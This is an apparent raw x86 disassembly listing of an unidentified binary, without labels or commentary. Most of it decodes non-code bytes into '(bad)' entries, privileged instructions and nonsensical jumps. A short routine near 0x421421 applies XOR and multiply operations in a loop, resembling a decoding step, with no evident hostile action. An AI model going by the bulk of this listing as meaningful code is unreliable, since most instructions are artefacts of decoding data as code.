  4212ae:	lds    esi,FWORD PTR [ebp+0xb]
  4212b1:	(bad)  
  4212b2:	loop   0x421234
  4212b4:	call   0xf97e0a5
  4212b9:	or     edi,DWORD PTR [ebp-0x6b]
  4212bc:	cmp    al,0x87
  4212be:	ror    bh,0xe9
  4212c1:	add    BYTE PTR [ebx],al
  4212c3:	(bad)  [ebx-0x1d8d2232]
  4212c9:	ret    
  4212ca:	test   DWORD PTR [edx+edi*8+0x7],0x6c35b4c1
  4212d2:	daa    
  4212d3:	rcl    DWORD PTR [esi-0x55257502],1
  4212d9:	xor    BYTE PTR [ebp+0x2d],ch
  4212dc:	jl     0x421278
  4212de:	push   esi
  4212df:	fmul   DWORD PTR [esi+0x2f572ae5]
  4212e5:	dec    edx
  4212e6:	pop    ds
  4212e7:	xchg   ebp,eax
  4212e8:	mov    DWORD PTR [ebx],ebp
  4212ea:	sbb    BYTE PTR [ebp+0x47925339],al
  4212f0:	push   esi
  4212f1:	pop    esi
  4212f2:	adc    ecx,DWORD PTR [ebp+0x3a]
  4212f5:	scas   al,BYTE PTR es:[edi]
  4212f6:	jp     0x421300
  4212f8:	mov    bl,0x81
  4212fa:	jecxz  0x421292
  4212fc:	inc    eax
  4212fd:	push   ds
  4212fe:	jns    0x4212ff
  421300:	mov    eax,ds:0x3c6d145d
  421305:	and    edx,DWORD PTR [eax-0x28]
  421308:	mov    WORD PTR [ebx+0x65],?
  42130b:	jge    0x4212ad
  42130d:	stc    
  42130e:	mov    bl,0xdd
  421310:	and    BYTE PTR [edi-0x41],0xf6
  421314:	sti    
  421315:	cld    
  421316:	push   cs
  421317:	clc    
  421318:	sub    BYTE PTR [ecx],al
  42131a:	pop    esi
  42131b:	scas   al,BYTE PTR es:[edi]
  42131c:	push   eax
  42131d:	sbb    eax,0x9973ad6e
  421322:	cwde   
  421323:	xchg   edx,eax
  421324:	retf   
  421325:	mov    fs,WORD PTR [edx+0xc]
  421328:	aam    0xe3
  42132a:	jne    0x4212c0
  42132c:	les    esp,FWORD PTR ds:0x71f38a5a
  421332:	in     al,dx
  421333:	mov    dl,0x43
  421335:	jecxz  0x4212cf
  421337:	es jmp 0xc005:0x479d1310
  42133f:	inc    esp
  421340:	and    DWORD PTR [esi+edi*2],esi
  421343:	call   0x6385f0e7
  421348:	retf   0x4a1
  42134b:	and    esp,DWORD PTR ds:0x87e6cee
  421351:	fdivr  QWORD PTR [edi-0xe25131e]
  421357:	pop    ds
  421358:	inc    ebx
  421359:	pushf  
  42135a:	push   esp
  42135b:	push   0xffffffed
  42135d:	popa   
  42135e:	and    BYTE PTR [edx-0x12d021c9],dh
  421364:	cmp    DWORD PTR [esi+0x342cc98d],0xe687d899
  42136e:	sbb    BYTE PTR [edx+0x47b9a891],al
  421374:	out    0x1a,al
  421376:	push   esp
  421377:	jmp    0x4213bf
  421379:	daa    
  42137a:	jo     0x421319
  42137c:	xchg   esi,eax
  42137d:	xchg   ebx,eax
  42137e:	rol    edi,0xb4
  421381:	cmp    al,0xfa
  421383:	mov    ebp,0x384d4a7d
  421388:	mov    bl,BYTE PTR [edi-0x13]
  42138b:	add    eax,DWORD PTR [ebp+0x17bbf582]
  421391:	pop    eax
  421392:	dec    edi
  421393:	xchg   esp,eax
  421394:	gs pop ss
  421396:	fdivr  QWORD PTR ds:0x72bbf4b1
  42139c:	int    0x86
  42139e:	or     edi,DWORD PTR [esi-0x6b5cd5ba]
  4213a4:	mov    cl,0xde
  4213a6:	mov    al,0x1e
  4213a8:	imul   esi,DWORD PTR [ecx+0x53],0xffffffa7
  4213ac:	xor    BYTE PTR [esi],ah
  4213ae:	mov    bl,0x6
  4213b0:	addr16 dec edi
  4213b2:	fldenv [edi+eax*4]
  4213b5:	int3   
  4213b6:	mov    bh,BYTE PTR [eax+0x5cd6f331]
  4213bc:	pop    esi
  4213bd:	sbb    edx,DWORD PTR [esi]
  4213bf:	(bad)  [esi+eax*1-0x16]
  4213c3:	lods   eax,DWORD PTR ds:[esi]
  4213c4:	xor    DWORD PTR [eax+0x2b],0x3a
  4213c8:	hlt    
  4213c9:	sub    edi,esi
  4213cb:	mov    esp,0xde41c8c6
  4213d0:	sbb    BYTE PTR [ebp-0x7b93ab8f],0x4f
  4213d7:	pop    ecx
  4213d8:	ins    BYTE PTR es:[edi],dx
  4213d9:	inc    ecx
  4213da:	in     al,dx
  4213db:	mov    ds:0x21339f2c,al
  4213e0:	xchg   ebp,eax
  4213e1:	leave  
  4213e2:	pushf  
  4213e3:	or     eax,0x43a0788a
  4213e8:	inc    edi
  4213e9:	inc    esp
  4213ea:	jle    0x42139a
  4213ec:	xor    al,0x63
  4213ee:	and    eax,0x897b898d
  4213f3:	jmp    0x4213a0
  4213f5:	pop    esp
  4213f6:	add    eax,0x837e0bcc
  4213fb:	loopne 0x4213a8
  4213fd:	add    BYTE PTR [ebx],ch
  4213ff:	dec    edi
  421400:	mov    esp,DWORD PTR [ebx]
  421402:	inc    ecx
  421403:	les    ebx,FWORD PTR [eax+0x582f4119]
  421409:	or     al,0x3f
  42140b:	xlat   BYTE PTR ds:[ebx]
  42140c:	and    cl,BYTE PTR [edx]
  42140e:	adc    DWORD PTR [ebx-0x37ccf7b3],ecx
  421414:	add    ecx,esi
  421416:	jne    0x41f07f
  42141c:	jmp    0x421467
  421421:	mov    ecx,DWORD PTR [ebp+0x8]
  421424:	mov    edx,DWORD PTR [ebp-0x8]
  421427:	xor    ecx,eax
  421429:	xor    edx,eax
  42142b:	sub    ecx,edx
  42142d:	sub    ecx,esi
  42142f:	xor    ecx,eax
  421431:	mov    DWORD PTR [ebp+0x8],ecx
  421434:	mov    ecx,DWORD PTR [ebp+0x8]
  421437:	mov    edx,DWORD PTR [ebp+0x8]
  42143a:	xor    ecx,eax
  42143c:	imul   edx,edx,0x5708f5
  421442:	add    ecx,esi
  421444:	lea    ecx,[ebp+ecx*4-0x64]
  421448:	mov    edi,DWORD PTR [ecx]
  42144a:	add    edx,edi
  42144c:	mov    DWORD PTR [ecx],edx
  42144e:	mov    ecx,DWORD PTR [ebp+0x8]
  421451:	xor    ecx,eax
  421453:	add    ecx,esi
  421455:	jne    0x421421
  42145b:	mov    ecx,DWORD PTR [ebp-0x8]
  42145e:	xor    ecx,eax
  421460:	mov    eax,DWORD PTR [ebp+0x10]
  421463:	add    ecx,esi
  421465:	mov    DWORD PTR [eax],ecx
  421467:	pop    edi
  421468:	pop    esi
  421469:	pop    ebx
  42146a:	leave  
  42146b:	ret    0xc
  42146e:	pop    ss
  42146f:	or     al,0x84
  421471:	repz lahf 
  421473:	sti    
  421474:	ja     0x421462
  421476:	stos   BYTE PTR es:[edi],al
  421477:	mov    edx,0xd10088e2
  42147c:	fidivr WORD PTR [ecx]
  42147e:	ja     0x42144d
  421480:	add    DWORD PTR [eax],eax
  421482:	arpl   WORD PTR [eax],ax
  421484:	add    BYTE PTR [eax],al
  421486:	jne    0x4214a8
  421488:	pop    edx
  421489:	or     ecx,DWORD PTR [esi+esi*8+0x48ac876a]
  421490:	fmul   st,st(1)
  421492:	sti    
  421493:	hlt    
  421494:	mov    eax,ds:0xa68f230e
  421499:	fnstenv [esi]
  42149b:	(bad)  
  42149c:	pop    edi
  42149d:	cmp    ecx,DWORD PTR [esi+eiz*2+0x18]
  4214a1:	retf   0x7d7a
  4214a4:	inc    edi
  4214a5:	pop    esi
  4214a6:	mov    eax,0x6cedb92c
  4214ab:	cmovns edi,DWORD PTR [esi]
  4214ae:	push   es
  4214af:	jae    0x421463
  4214b1:	aam    0x92
  4214b3:	lea    esp,[esp+edi*4]
  4214b6:	ror    BYTE PTR [esi],1
  4214b8:	ret    
  4214b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4214ba:	push   ebx
  4214bb:	imul   edi,esi,0x2b0d7938
  4214c1:	xchg   ecx,eax
  4214c2:	into   
  4214c3:	mov    bl,0x7b
  4214c5:	(bad)  [eax+esi*2+0x742d02e6]
  4214cc:	scas   al,BYTE PTR es:[edi]
  4214cd:	lods   al,BYTE PTR ds:[esi]
  4214ce:	loopne 0x4214e4
  4214d0:	mov    dl,0xde
  4214d2:	rcl    edi,1
  4214d4:	addr16 in al,0xb1
  4214d7:	mov    al,ds:0x9d817b37
  4214dc:	addr16 inc ebx
  4214de:	pop    edx
  4214df:	mov    edi,0x42f6f511
  4214e4:	push   esp
  4214e5:	pop    edx
  4214e6:	jl     0x421516
  4214e8:	cwde   
  4214e9:	add    BYTE PTR [eax],al
  4214eb:	add    BYTE PTR [eax],al
  4214ed:	add    cl,dl
  4214ef:	sub    al,0x14
  4214f1:	adc    edi,ebp
  4214f3:	cmp    edx,edi
  4214f5:	out    dx,al
  4214f6:	pop    edi
  4214f7:	xchg   bx,ax
  4214f9:	push   0x39c61a5f
  4214fe:	fcmove st,st(5)
  421500:	add    DWORD PTR [eax],eax
  421502:	arpl   WORD PTR [eax],ax
  421504:	add    BYTE PTR [eax],al
  421506:	in     eax,0x79
  421508:	outs   dx,DWORD PTR ds:[esi]
  421509:	mov    ss,WORD PTR [esi]
  42150b:	inc    di
  42150d:	arpl   WORD PTR [esi-0x6b],si
  421510:	(bad)  
  421511:	mov    eax,0xc780a306
  421516:	stos   DWORD PTR es:[edi],eax
  421517:	and    ah,al
  421519:	out    0x6c,al
  42151b:	xor    bl,BYTE PTR [ecx+0x1f]
  42151e:	popa   
  42151f:	ds sahf 
  421521:	push   ebp
  421522:	dec    ebp
  421523:	fisttp WORD PTR [esi+0x55]
  421526:	arpl   di,sp
  421528:	xor    eax,0x4dd405d7
  42152d:	lods   al,BYTE PTR ds:[esi]
  42152e:	loop   0x421515
  421530:	or     DWORD PTR [edx+eiz*2-0x32],0xf7079467
  421538:	cmp    edx,DWORD PTR [eax-0x67]
  42153b:	(bad)  
  42153c:	fcmovnu st,st(5)
  42153e:	add    al,BYTE PTR [edx-0x2736c1da]
  421544:	(bad)  
  421546:	test   DWORD PTR [edx+0x3f],esp
  421549:	mov    WORD PTR [edi],?
  42154b:	jmp    0x421518
  42154d:	ficom  DWORD PTR [ebx+0x790309e7]
  421553:	xchg   esi,eax
  421554:	ins    DWORD PTR es:[edi],dx
  421555:	or     al,BYTE PTR [ebp-0x963be8]
  42155b:	jle    0x421597
  42155d:	test   BYTE PTR [edi-0x65],cl
  421560:	adc    al,0xd2
  421562:	mov    eax,ds:0x4f69893a
  421567:	ret    0xcf
  42156a:	add    BYTE PTR [eax],al
  42156c:	add    BYTE PTR [eax],al
  42156e:	pop    ds
  42156f:	sub    esp,DWORD PTR [eax-0x60404bc1]
  421575:	sub    eax,esi
  421577:	add    BYTE PTR [edi+eax*2+0x678dafb1],0x3d
  42157f:	into   
  421580:	add    DWORD PTR [eax],eax
  421582:	arpl   WORD PTR [eax],ax
  421584:	add    BYTE PTR [eax],al
  421586:	sbb    dh,ah
  421588:	mov    ah,cl
  42158a:	jo     0x421601
  42158c:	or     eax,DWORD PTR [ebp-0x144d50ac]
  421592:	pop    ecx
  421593:	gs pop ss
  421595:	mov    bl,0x1e
  421597:	mov    ecx,0x3b8e14d5
  42159c:	mov    ds:0x69461acc,eax
  4215a1:	ret    
  4215a2:	xor    esp,ecx
  4215a4:	pop    eax
  4215a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4215a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4215a7:	and    al,0xc9
  4215a9:	add    BYTE PTR [edx],ch
  4215ab:	cmp    eax,0x1642a783
  4215b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4215b1:	adc    ebp,DWORD PTR [esp+esi*2-0x4ab1b844]
  4215b8:	scas   al,BYTE PTR es:[edi]
  4215b9:	mov    edx,0xc9e59152
  4215be:	mov    ds:0x96736f77,eax
  4215c3:	pop    ebx
  4215c4:	mov    al,0x71
  4215c6:	mov    edx,0xcf2e3d50
  4215cb:	mov    cl,0x1d
  4215cd:	inc    esp
  4215ce:	(bad)  
  4215cf:	neg    dh
  4215d1:	jb     0x421583
  4215d3:	std    
  4215d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4215d5:	aam    0x76
  4215d7:	adc    edx,DWORD PTR [edx+edx*2-0x381dbf68]
  4215de:	push   0x52
  4215e0:	dec    esi
  4215e1:	int    0xf6
  4215e3:	ret    0x5fb7
  4215e6:	mov    bh,0x3
  4215e8:	sti    
  4215e9:	add    BYTE PTR [eax],al
  4215eb:	add    BYTE PTR [eax],al
  4215ed:	add    BYTE PTR [edi],ch
  4215ef:	and    al,0xf0
  4215f1:	aam    0xfb
  4215f3:	aam    0x2f
  4215f5:	jmp    FWORD PTR [esi+0x33]
  4215f8:	je     0x4215b0
  4215fa:	popa   
  4215fb:	xchg   BYTE PTR [edx+0x1cea019],bh
  421601:	add    BYTE PTR [ebx+0x0],ah
  421604:	add    BYTE PTR [eax],al
  421606:	mov    ch,0x34
  421608:	daa    
  421609:	mov    bl,0xf3
  42160b:	mov    ecx,DWORD PTR [esi]
  42160d:	fisub  DWORD PTR [edi]
  42160f:	outs   dx,DWORD PTR ds:[esi]
  421610:	xor    cl,cl
  421612:	inc    ebp
  421613:	scas   al,BYTE PTR es:[edi]
  421614:	in     eax,dx
  421615:	std    
  421616:	or     eax,0x30b46d3d
  42161b:	icebp  
  42161c:	fnstsw WORD PTR [edi]
  42161e:	and    BYTE PTR [ecx+0x5182af70],cl
  421624:	rcl    BYTE PTR [edi+0x46],0x50
  421628:	out    dx,eax
  421629:	pop    ecx
  42162a:	push   0x36ad7b8f
  42162f:	(bad)  
  421630:	call   0xc1247361
  421635:	sbb    al,0xe5
  421637:	daa    
  421638:	adc    edx,DWORD PTR [ebp-0x33]
  42163b:	fisubr DWORD PTR [ecx+0x15d4981c]
  421641:	fstp   TBYTE PTR [eax+0x4142ecd7]
  421647:	hlt    
  421648:	pop    ebp
  421649:	into   
  42164a:	or     eax,0x5a1dcd25
  42164f:	std    
  421650:	dec    esi
  421651:	sub    al,0x35
  421653:	jle    0x42160e
  421655:	mov    ebx,0x3686d109
  42165a:	fcmovb st,st(0)
  42165c:	or     esi,DWORD PTR [ecx]
  42165e:	inc    ecx
  42165f:	out    0xc4,al
  421661:	push   ebp
  421662:	addr16 test eax,0x414d7271
  421668:	lds    eax,FWORD PTR [eax]
  42166a:	add    BYTE PTR [eax],al
  42166c:	add    BYTE PTR [eax],al
  42166e:	retf   0x76a0
  421671:	dec    ebp
  421672:	jle    0x421653
  421674:	sti    
  421675:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421676:	mov    bh,0x83
  421678:	dec    edi
  421679:	mov    ds:0xfb4625b0,al
  42167e:	add    ecx,edi
  421680:	add    DWORD PTR [eax],eax
  421682:	arpl   WORD PTR [eax],ax
  421684:	add    BYTE PTR [eax],al
  421686:	pop    ds
  421687:	and    ebx,edx
  421689:	and    eax,0x955b1f0a
  42168e:	sbb    al,0xaa
  421690:	repz jbe 0x421648
  421693:	ficomp DWORD PTR ds:0xa5cc3604
  421699:	fucomi st,st(0)
  42169b:	jns    0x4216e2
  42169d:	div    ebp
  42169f:	fidivr DWORD PTR [ebx-0x7a]
  4216a2:	loopne 0x421721
  4216a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4216a5:	add    al,0xff
  4216a7:	(bad)  
  4216a8:	icebp  
  4216a9:	pop    ds
  4216aa:	lods   al,BYTE PTR ds:[esi]
  4216ab:	mov    dl,0x97
  4216ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4216ae:	popf   
  4216af:	inc    edx
  4216b0:	js     0x4216a9
  4216b2:	rcr    DWORD PTR [edx-0x70],1
  4216b5:	cmc    
  4216b6:	push   edi
  4216b7:	sub    DWORD PTR [eax-0x453a1840],edx
  4216bd:	xchg   ecx,eax
  4216be:	add    BYTE PTR [ecx+0x31],0xf8
  4216c2:	push   0xffffffbe
  4216c4:	cs inc ebp
  4216c6:	dec    eax
  4216c7:	popa   
  4216c8:	pop    eax
  4216c9:	mov    BYTE PTR [ebp+edi*8-0x7],dl
  4216cd:	es mov edx,0x4659d21b
  4216d3:	cdq    
  4216d4:	scas   eax,DWORD PTR es:[di]
  4216d6:	test   DWORD PTR [ebp-0x7f],0x93fc41cb
  4216dd:	call   0x14db2695
  4216e2:	pushf  
  4216e3:	cmp    ebx,ebp
  4216e5:	dec    edx
  4216e6:	adc    edx,esp
  4216e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4216e9:	add    BYTE PTR [eax],al
  4216eb:	add    BYTE PTR [eax],al
  4216ed:	add    dh,al
  4216ef:	out    dx,al
  4216f0:	lods   al,BYTE PTR ds:[esi]
  4216f1:	cmp    ch,BYTE PTR [edx+edi*2+0x5223fed6]
  4216f8:	stc    
  4216f9:	stc    
  4216fa:	pop    esp
  4216fb:	es sub eax,0x1cf66a2
  421701:	add    BYTE PTR [ebx+0x0],ah
  421704:	add    BYTE PTR [eax],al
  421706:	mov    eax,ds:0x3022e969
  42170b:	jmp    0xa75bdf80
  421710:	inc    ebx
  421711:	loope  0x421721
  421713:	loop   0x4216aa
  421715:	test   edi,edx
  421717:	cdq    
  421718:	je     0x4216ee
  42171a:	mov    edi,0xd243b9c2
  42171f:	std    
  421720:	shl    BYTE PTR fs:[ecx],0x2f
  421724:	jmp    0x421775
  421726:	das    
  421727:	inc    ecx
  421728:	into   
  421729:	sub    bx,WORD PTR [eax+ebx*8-0x191223d2]
  421731:	jae    0x4216ce
  421733:	(bad)  
  421734:	jge    0x4216ef
  421736:	jmp    0x421726
  421738:	push   0x37
  42173a:	outs   dx,BYTE PTR es:[esi]
  42173c:	mov    edx,0xbfe47a95
  421741:	push   ebx
  421742:	add    al,0xbd
  421744:	mov    ch,0xa7
  421746:	dec    ebx
  421747:	jmp    0xb86e:0xdeb84571
  42174e:	pop    ecx
  42174f:	cmp    dh,dl
  421751:	shl    edi,1
  421753:	and    BYTE PTR [edx+0x647dd239],dh
  421759:	out    dx,eax
  42175a:	sbb    eax,0x2c6a78b3
  42175f:	push   esp
  421760:	arpl   WORD PTR [eax],sp
  421762:	inc    eax
  421763:	jge    0x421797
  421765:	mov    edx,0xe13b27
  42176a:	add    BYTE PTR [eax],al
  42176c:	add    BYTE PTR [eax],al
  42176e:	push   edx
  42176f:	xor    al,0x40
  421771:	gs data16 jne 0x4217ec
  421775:	aaa    
  421776:	push   0x126a4e09
  42177b:	stos   DWORD PTR es:[edi],eax
  42177c:	push   cs
  42177d:	iret   
  42177e:	leave  
  42177f:	iret   
  421780:	add    DWORD PTR [eax],eax
  421782:	arpl   WORD PTR [eax],ax
  421784:	add    BYTE PTR [eax],al
  421786:	sub    ah,BYTE PTR [ebx+edx*1-0x6f]
  42178a:	int3   
  42178b:	mov    ?,esp
  42178d:	(bad)  
  42178f:	push   ebp
  421790:	scas   eax,DWORD PTR es:[edi]
  421791:	fs push edx
  421793:	jl     0x42172f
  421795:	cmp    BYTE PTR [edx],al
  421797:	shr    DWORD PTR [esi],1
  421799:	cwde   
  42179a:	xchg   BYTE PTR [ebp-0x4e],ah
  42179d:	call   0x448fc73b
  4217a2:	xor    BYTE PTR [edi-0x492b5c6f],dl
  4217a8:	dec    esp
  4217a9:	fidiv  DWORD PTR [edx]
  4217ab:	sar    DWORD PTR [edi+0x13b9d351],0xf1
  4217b2:	fidivr DWORD PTR [edx-0x1d]
  4217b5:	sub    al,0x24
  4217b7:	(bad)  
  4217b8:	je     0x4217bf
  4217ba:	retf   0x44df
  4217bd:	adc    al,0x50
  4217bf:	mov    BYTE PTR [edx],ah
  4217c1:	fisub  DWORD PTR [ecx]
  4217c3:	pop    ds
  4217c4:	dec    esp
  4217c5:	mov    eax,ds:0x9cb87495
  4217ca:	inc    eax
  4217cb:	push   edx
  4217cc:	aas    
  4217cd:	js     0x42182d
  4217cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4217d0:	aam    0x87
  4217d2:	push   esp
  4217d3:	sti    
  4217d4:	dec    edi
  4217d5:	xor    eax,DWORD PTR [edx+0x5c5bcd0e]
  4217db:	push   0x6e
  4217dd:	adc    DWORD PTR [eax+0x4b],ebx
  4217e0:	adc    bh,bl
  4217e2:	loope  0x4217f3
  4217e4:	sbb    al,0x73
  4217e6:	fimul  WORD PTR es:[ecx+0x0]
  4217ed:	add    BYTE PTR [edx],dl
  4217ef:	mov    edx,0xe6f8c6d8
  4217f4:	push   ds
  4217f5:	(bad)  
  4217f6:	adc    bl,dh
  4217f8:	cwde   
  4217f9:	out    dx,al
  4217fa:	inc    esi
  4217fb:	mov    ah,0x56
  4217fd:	xchg   edi,eax
  4217fe:	mov    esp,0x630001e2
  421803:	add    BYTE PTR [eax],al
  421805:	add    BYTE PTR [ebx+edx*2-0x372c683b],bl
  42180c:	adc    DWORD PTR [ecx],edx
  42180e:	iret   
  42180f:	add    BYTE PTR [ebp+0x24cacd85],ah
  421815:	cs sti 
  421817:	add    BYTE PTR [eax+0xa],0x31
  42181b:	and    esi,0x6ec9d377
  421821:	xor    eax,edx
  421823:	inc    ecx
  421824:	and    eax,0xab12c3e2
  421829:	test   BYTE PTR [esi-0x1b320e9d],0x65
  421830:	mov    ebp,0x11e870de
  421835:	int    0xfd
  421837:	jl     0x421883
  421839:	inc    ebp
  42183a:	push   ds
  42183b:	ja     0x42180a
  42183d:	dec    edx
  42183e:	jo     0xa032519c
  421844:	xor    DWORD PTR [edi+ecx*1],esp
  421847:	pop    es
  421848:	(bad)  
  421849:	xor    ebx,eax
  42184b:	jecxz  0x4218a2
  42184d:	pop    ecx
  42184e:	fbld   TBYTE PTR [eax+0x20fde69]
  421854:	inc    ebx
  421855:	iret   
  421856:	aas    
  421857:	push   esp
  421858:	mov    dh,0xcb
  42185a:	cmp    BYTE PTR [eax],bl
  42185c:	cmc    
  42185d:	inc    ebp
  42185e:	jnp    0x4218d2
  421860:	clc    
  421861:	push   edx
  421862:	mov    ah,0x8d
  421864:	js     0x4218b9
  421866:	idiv   BYTE PTR [edi+0x9f]
  42186c:	add    BYTE PTR [eax],al
  42186e:	dec    ecx
  42186f:	inc    esi
  421870:	sub    BYTE PTR [eax],dh
  421872:	das    
  421873:	jle    0x4218ce
  421875:	jg     0x42183d
  421877:	imul   esi,eax,0xffffffd5
  42187a:	test   BYTE PTR [eax],cl
  42187c:	aaa    
  42187d:	sbb    ebx,DWORD PTR [edi]
  42187f:	jecxz  0x421882
  421881:	add    BYTE PTR [ebx+0x0],ah
  421884:	add    BYTE PTR [eax],al
  421886:	ja     0x42184c
  421888:	ret    
  421889:	in     al,dx
  42188a:	sti    
  42188b:	adc    eax,0x66657607
  421890:	(bad)  
  421891:	shl    DWORD PTR [esi-0x4586f33f],cl
  421897:	mov    ebp,0x96304d1e
  42189c:	and    DWORD PTR [esi],ecx
  42189e:	cmovle ebx,DWORD PTR [eax-0x3d1082ba]
  4218a5:	aad    0xf3
  4218a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4218a8:	imul   edx,DWORD PTR [esi+edx*2],0x30
  4218ac:	shl    DWORD PTR [esi-0x2de98894],0x30
  4218b3:	aas    
  4218b4:	add    edi,DWORD PTR [eax+0x3c]
  4218b7:	ins    DWORD PTR es:[edi],dx
  4218b8:	sbb    al,0x6
  4218ba:	imul   ecx,edx,0x15
  4218bd:	xor    eax,0x2e6a3eea
  4218c2:	test   al,0xf0
  4218c4:	pop    ebx
  4218c5:	or     DWORD PTR [ebp+0x5cbab6c5],0x5190b5cd
  4218cf:	adc    edx,ecx
  4218d1:	sub    ecx,ebx
  4218d3:	push   0x69876c6a
  4218d8:	jle    0x42193a
  4218da:	pop    ebp
  4218db:	imul   edx,edi,0xfffffffa
  4218de:	or     esi,DWORD PTR [eax+edi*8]
  4218e1:	xor    eax,0x30e153a4
  4218e6:	dec    eax
  4218e7:	add    DWORD PTR [eax+eax*1+0x0],ebx
  4218ee:	addr16 (bad) 
  4218f0:	and    dh,dh
  4218f2:	mov    eax,ds:0xe7d7f7f6
  4218f7:	mov    eax,0x235eda72
  4218fc:	int    0x63
  4218fe:	and    bl,0x1
  421901:	add    BYTE PTR [ebx+0x0],ah
  421904:	add    BYTE PTR [eax],al
  421906:	jno    0x421983
  421908:	or     esp,DWORD PTR [ecx]
  42190a:	xor    al,0x7f
  42190c:	fnsave [ebp+0x3e]
  42190f:	call   0xe9c2:0x3511a596
  421916:	dec    esp
  421917:	sub    dh,ch
  421919:	mov    bl,0x4f
  42191b:	js     0x421906
  42191d:	ret    0x5190
  421920:	repnz sbb BYTE PTR [edi],0xb1
  421924:	push   eax
  421925:	mov    esp,0xea9a1b9d
  42192a:	mov    DWORD PTR [edx-0x64],ebp
  42192d:	push   ds
  42192e:	xchg   edx,eax
  42192f:	sub    al,0x25
  421931:	inc    ebx
  421932:	push   eax
  421933:	mov    eax,gs
  421935:	aaa    
  421936:	sub    DWORD PTR [ebp-0x44],0x67
  42193a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42193b:	jl     0x4219af
  42193d:	xchg   ecx,eax
  42193f:	shl    DWORD PTR [edx],cl
  421941:	fadd   DWORD PTR [esi]
  421943:	cli    
  421944:	pop    ebx
  421945:	fs int 0xc
  421948:	xchg   ecx,eax
  421949:	cli    
  42194a:	cld    
  42194b:	add    esi,DWORD PTR [eax+0x2c]
  42194e:	add    BYTE PTR [edx],0x49
  421951:	pop    eax
  421952:	mov    WORD PTR [ecx+0x3c1d40f1],gs
  421958:	xchg   ebp,eax
  421959:	pop    ss
  42195a:	mov    bh,0xda
  42195c:	pop    ds
  42195d:	dec    ebp
  42195e:	and    ah,BYTE PTR [eax+0x7c]
  421961:	mov    esi,0x12dc1346
  421966:	mul    BYTE PTR [ebx]
  421968:	jp     0x42196a
  42196a:	add    BYTE PTR [eax],al
  42196c:	add    BYTE PTR [eax],al
  42196e:	ret    
  42196f:	or     eax,0xefee66a6
  421974:	ret    
  421975:	lods   eax,DWORD PTR ds:[esi]
  421976:	sub    al,0xb8
  421978:	mov    ds:0x6af50a47,eax
  42197d:	cld    
  42197e:	in     eax,0xe3
  421980:	add    DWORD PTR [eax],eax
  421982:	arpl   WORD PTR [eax],ax
  421984:	add    BYTE PTR [eax],al
  421986:	stc    
  421987:	push   0x5fd09e1a
  42198c:	xchg   ebp,eax
  42198d:	jnp    0x4219f0
  42198f:	jae    0x421925
  421991:	outs   dx,BYTE PTR ds:[esi]
  421992:	mov    ebp,0xa8cb6249
  421997:	retf   0xa3be
  42199a:	jmp    0x1441d465
  42199f:	xchg   edi,eax
  4219a0:	add    bh,dh
  4219a2:	xchg   esp,eax
  4219a3:	fwait
  4219a4:	pop    es
  4219a5:	pushf  
  4219a6:	push   ss
  4219a7:	inc    esp
  4219a8:	dec    esi
  4219a9:	mov    ecx,0x3cab9001
  4219ae:	lock fcmovnbe st,st(5)
  4219b1:	mov    eax,ds:0x5b911cd9
  4219b6:	dec    eax
  4219b7:	mov    BYTE PTR [ebx-0x21],dh
  4219ba:	push   ebx
  4219bb:	cld    
  4219bc:	rol    DWORD PTR [ebx-0x1fb7f99b],cl
  4219c2:	inc    esp
  4219c3:	mov    eax,0xa65695e0
  4219c8:	jns    0x421a2e
  4219ca:	ror    BYTE PTR ss:[ebx-0x5c],1
  4219ce:	mov    bh,0x1e
  4219d0:	ret    
  4219d1:	mov    WORD PTR [ecx+0x6146a511],?
  4219d7:	pop    ds
  4219d8:	pop    edx
  4219d9:	mov    ecx,0xf397cb2d
  4219de:	inc    eax
  4219df:	js     0x4219a6
  4219e1:	sub    ebx,DWORD PTR [ebx-0x5c]
  4219e4:	pop    esi
  4219e5:	sub    DWORD PTR [edi],esp
  4219e7:	or     DWORD PTR [ebp+0x0],0x0
  4219ee:	fld    st(2)
  4219f0:	add    eax,0xddcf1f49
  4219f5:	ror    al,cl
  4219f7:	outs   dx,DWORD PTR ds:[esi]
  4219f8:	clc    
  4219f9:	sar    BYTE PTR [ecx],cl
  4219fb:	arpl   WORD PTR [esi],dx
  4219fd:	ror    BYTE PTR [eax-0x1c],0x1
  421a01:	add    BYTE PTR [ebp+0x0],cl
  421a04:	add    BYTE PTR [eax],al
  421a06:	in     al,0x55
  421a08:	mov    dh,0xdc
  421a0a:	daa    
  421a0b:	(bad)  
  421a0c:	(bad)  
  421a0e:	add    esi,DWORD PTR [edx+0x7ef28f5]
  421a14:	add    dl,BYTE PTR [edi+0x48c42e71]
  421a1a:	das    
  421a1b:	out    dx,al
  421a1c:	je     0x421a18
  421a1e:	cmc    
  421a1f:	ins    DWORD PTR es:[edi],dx
  421a20:	dec    esi
  421a21:	mov    edi,0x841a221c
  421a26:	loopne 0x4219ba
  421a28:	add    al,0x5c
  421a2a:	mov    ds:0xe0b7a50f,eax
  421a2f:	(bad)  
  421a30:	push   edx
  421a31:	jnp    0x4219de
  421a33:	pop    esi
  421a34:	mov    bl,0xdb
  421a36:	in     al,0x51
  421a38:	mov    dh,cl
  421a3a:	fbstp  TBYTE PTR [edi-0x68]
  421a3d:	xchg   ebp,eax
  421a3e:	add    DWORD PTR [eax-0x7c],esi
  421a41:	mov    ecx,0x10173773
  421a46:	or     DWORD PTR [ebx-0x4d64471d],edx
  421a4c:	leave  
  421a4d:	repnz out 0xed,al
  421a50:	mov    WORD PTR [ebp+edx*1+0x0],?
	...
  421a5c:	add    BYTE PTR [eax],al
  421a5e:	add    BYTE PTR [eax-0x6ffbffbe],dl
  421a64:	inc    edx
  421a65:	add    BYTE PTR [eax],cl
  421a67:	nop
  421a68:	inc    edx
  421a69:	add    BYTE PTR [eax+edx*4],cl
  421a6c:	inc    edx
  421a6d:	add    BYTE PTR [eax],dl
  421a6f:	nop
  421a70:	inc    edx
